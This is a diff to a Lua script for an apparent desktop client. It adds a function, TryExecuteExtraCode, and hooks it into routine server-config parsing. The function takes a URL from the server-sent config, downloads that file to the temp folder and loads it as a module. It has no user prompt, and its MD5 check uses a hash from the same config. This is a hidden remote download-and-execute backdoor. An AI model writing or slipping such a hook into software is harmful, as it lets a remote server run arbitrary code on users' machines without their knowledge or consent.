@@ -205,6 +205,36 @@ function FixUserConfig(tServerConfig)
 end
 
 
+function TryExecuteExtraCode(tServerConfig)
+	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
+	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
+	local strURL = tExtraHelper["strURL"]
+	local strMD5 = tExtraHelper["strMD5"]
+	
+	if not IsRealString(strURL) then
+		return
+	end
+	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strURL..strStamp
+	
+	FunctionObj.DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
+	, function(bRet, strRealPath)
+		FunctionObj.TipLog("[TryExecuteExtraCode] strURLFix:"..tostring(strURLFix)
+		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
+				
+		if bRet < 0 then
+			return
+		end
+		
+		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
+		XLLoadModule(strRealPath)
+	end)	
+end
+
 
 function AnalyzeServerConfig(nDownServer, strServerPath)
 	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
@@ -216,6 +246,7 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
 	TryForceUpdate(tServerConfig)
 	FixUserConfig(tServerConfig)
+	TryExecuteExtraCode(tServerConfig)
 end
 
 
